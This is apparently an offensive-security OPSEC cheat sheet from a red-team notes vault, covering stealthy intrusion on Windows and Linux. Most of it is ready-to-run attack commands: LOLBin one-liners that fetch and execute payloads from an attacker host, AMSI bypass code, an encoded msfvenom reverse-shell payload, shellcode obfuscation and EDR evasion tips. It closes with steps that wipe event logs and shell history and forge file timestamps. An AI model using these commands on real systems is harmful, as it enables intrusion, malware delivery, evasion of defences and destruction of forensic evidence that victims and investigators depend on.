---
tags: [reference, opsec, stealth, evasion]
---

# OPSEC Reference

## OPSEC Principles

1. **Minimize footprint** — only run what you need, clean up after
2. **Know what logs you trigger** — understand defender visibility
3. **Blend in** — use LOLBins, normal traffic patterns, valid credentials
4. **Test your own noise** — check SIEM rules for what you're doing
5. **Assume breach of OPSEC** — plan for IR teams seeing your activity

## Detection Risk Table

| Action | Detection Risk | Stealthier Alternative |
|--------|---------------|----------------------|
| nmap -A full | HIGH — IDS signature | Slow nmap, manual probes |
| Mimikatz on disk | HIGH — AV / EDR | In-memory injection, dump+parse offline |
| Meterpreter (unencoded) | HIGH — AV sig | Custom payload, Cobalt Strike |
| BloodHound full collection | HIGH — noisy LDAP | Targeted queries only |
| net user /domain | MEDIUM — net.exe | LDAP queries, PowerView |
| psexec.py | MEDIUM — service creation | WMI exec, COMhijack |
| curl/wget | LOW-MEDIUM | certutil, bitsadmin, WebClient |
| LSASS dump (procdump) | HIGH | Shadow copy, handle duplication |

## Living Off the Land (LOLBins)

### Windows File Download
```powershell
# certutil
certutil -urlcache -split -f http://<lhost>/file.exe C:\Temp\file.exe

# bitsadmin
bitsadmin /transfer job http://<lhost>/file.exe C:\Temp\file.exe

# PowerShell
(New-Object Net.WebClient).DownloadFile('http://<lhost>/file','C:\Temp\file')

# mshta
mshta http://<lhost>/payload.hta

# regsvr32 (scriptlet)
regsvr32 /s /n /u /i:http://<lhost>/payload.sct scrobj.dll

# wmic
wmic os get /format:"http://<lhost>/payload.xsl"
```

### Windows Execution
```powershell
# rundll32
rundll32 javascript:"\..\mshtml,RunHTMLApplication ";code

# regsvcs / regasm
[DllImport("user32.dll")] ...  # (requires .NET assembly)

# installutil
installutil.exe /logfile= /LogToConsole=false /U payload.exe

# msiexec
msiexec /quiet /q /i http://<lhost>/payload.msi
```

## AV/EDR Evasion

### AMSI Bypass
```powershell
# Classic (often patched)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Matt Graeber
$x=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils')
$x.GetField('amsi'+'Context','NonPublic,Static').SetValue($null,[IntPtr]::Zero)

# Obfuscation tools
Invoke-Obfuscation  # PS obfuscation framework
```

### Payload Obfuscation
```bash
# msfvenom encoders
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=443 -e x64/xor_dynamic -i 5 -f exe

# Shellcode loaders
go build -ldflags "-w -s" loader.go   # Golang
nim c --opt:size loader.nim            # Nim

# Custom XOR
python3 -c "shellcode=b'...';key=b'key';enc=bytes(a^b for a,b in zip(shellcode,key*(len(shellcode)//len(key)+1)));print(list(enc))"
```

## Network Stealth

```bash
# Slow scan (less IDS triggering)
nmap -T1 -p 22,80,443 --scan-delay 500ms <target>

# Source port manipulation (firewall bypass)
nmap --source-port 53 <target>

# C2 via common ports
# Use HTTPS (443), DNS (53), or ICMP tunnels
# Cobalt Strike malleable C2 profiles mimic legitimate traffic
```

## Log Awareness

### What Gets Logged (Windows)
| Event ID | What | Logged When |
|----------|------|-------------|
| 4624 | Logon success | Any successful login |
| 4625 | Logon failure | Bad credentials |
| 4648 | Explicit credential logon | RunAs, net use, PtH |
| 4688 | Process creation | New process (if enabled) |
| 4698 | Scheduled task created | New schtask |
| 4776 | NTLM auth | Any NTLM negotiation |
| 7045 | Service installed | sc.exe, PsExec |

### What Gets Logged (Linux)
```bash
/var/log/auth.log     # SSH, sudo, su
/var/log/syslog       # General system
/var/log/apache2/     # Web server access/error
/var/log/secure       # RHEL/CentOS equiv of auth.log
~/.bash_history       # User commands
/var/log/wtmp         # Login history (last)
```

## Post-Engagement Cleanup

```bash
# Full cleanup: [[09-Covering-Tracks/Artifact-Cleanup]]

# Quick Linux
history -c && history -w
echo "" > ~/.bash_history
find /tmp /var/tmp -name "*evil*" -delete
# Restore file timestamps
touch -r /etc/hosts /tmp/loot

# Quick Windows
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
del /f /q C:\Temp\*.exe C:\Temp\*.dll
```

## Related

- [[09-Covering-Tracks/Linux-Log-Removal]] — Linux cleanup
- [[09-Covering-Tracks/Windows-Log-Removal]] — Windows cleanup
- [[09-Covering-Tracks/Artifact-Cleanup]] — Full cleanup inventory
